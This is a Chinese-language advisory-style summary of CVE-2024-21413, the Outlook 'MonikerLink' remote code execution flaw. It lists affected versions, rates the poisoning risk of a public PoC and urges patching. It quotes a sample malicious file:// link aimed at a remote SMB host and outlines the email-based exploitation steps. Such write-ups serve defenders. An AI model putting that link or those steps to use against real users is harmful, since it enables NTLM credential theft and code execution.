## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致信息泄露、NTLM凭据窃取和远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office LTSC 2021、Microsoft 365 Apps for Enterprise、Microsoft Outlook 2016 和 Microsoft Office 2019。具体受影响版本请参考漏洞库信息。

**利用条件:** 攻击者需要能够通过电子邮件向目标用户发送特制邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中存在的一个远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过在电子邮件中嵌入特制的 `file://` 链接，绕过 Protected View 并执行恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞被标记为严重，且存在在野利用。提供的 POC 代码利用了 `file://` 协议处理中的缺陷，通过构造恶意链接（例如 `file:///\\10.10.111.111\test\test.rtf!exploit`）来触发漏洞。POC 代码中给出了使用示例，表明该漏洞利用方式是有效的。

**投毒风险：**
POC 代码本身看起来是直接的，旨在利用该漏洞进行远程代码执行或者泄露NTLM凭据。但是，**存在以下几点需要注意**：
1.  **短链接风险**: POC 使用短链接 `https://shorturl.at/7itzw` 下载代码，这本身就是一个潜在的风险点。虽然当前链接可能指向合法的代码仓库，但攻击者可以随时更改短链接的目标地址，从而传播恶意软件。
2.  **Payload 可定制性**：该 POC 允许用户自定义 payload，这为潜在的恶意利用敞开了大门。用户可以将 payload 设置为下载和执行恶意代码，从而实现远程控制等目的。
3.  **隐蔽的后门植入**: 由于代码可以被修改,有可能被植入后门。

考虑到短链接带来的不确定性，Payload的可定制性，以及后门植入的可能性，存在30%的投毒风险。

**利用方式：**
1.  **构造恶意邮件：** 攻击者创建一个包含特制 `file://` 链接的电子邮件。
2.  **发送邮件：** 将该邮件发送给目标用户。
3.  **触发漏洞：** 当用户打开邮件时，Outlook 尝试解析 `file://` 链接。如果链接构造不当（例如包含 `!exploit`），则可能触发漏洞，导致执行恶意代码或泄露 NTLM 凭据。
4.  **远程代码执行或凭据窃取：** 如果成功利用该漏洞，攻击者可以执行任意代码或窃取用户的 NTLM 凭据，从而进一步控制受害者的系统。

综上所述，CVE-2024-21413 是一个严重的漏洞，利用方式相对简单，且存在有效的 POC 代码。企业应尽快应用 Microsoft 提供的补丁，以防止攻击者利用该漏洞进行攻击。

**项目地址:** [Cyber-Trambon/CVE-2024-21413-exploit](https://github.com/Cyber-Trambon/CVE-2024-21413-exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)